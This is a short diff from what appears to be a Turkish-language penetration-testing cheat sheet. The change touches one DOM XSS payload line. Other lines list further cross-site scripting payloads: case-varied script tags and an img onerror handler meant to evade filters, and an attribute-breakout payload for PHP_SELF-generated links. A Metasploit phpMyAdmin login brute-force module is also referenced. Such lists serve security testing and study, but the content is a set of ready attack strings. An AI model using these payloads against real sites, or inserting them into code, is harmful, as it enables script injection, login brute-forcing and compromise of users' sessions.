@@ -269,7 +269,7 @@ msfconsole search phpmyadmin_login : phpmyadmin auxiliary brute force
 
 ------------------------------------------
 xss
-<script>window.onload = function () {var link=document.getElementById("link");link.href="http://newssite.com"}</script> : dom xss için
+<script>window.onload = function () {var link=document.getElementById("link"); link.href="http://newssite.com";}</script> : dom xss için
 <sCrIpt>alert("XsS")</scRiPt> : filtrelemeler için
 "><sCrIpt>alert("XsS")</scRiPt> : php_self ile oluşturulmuş linkler için
 <iMg SrC="x" oNeRRor="alert(1);"> : filtreleme için
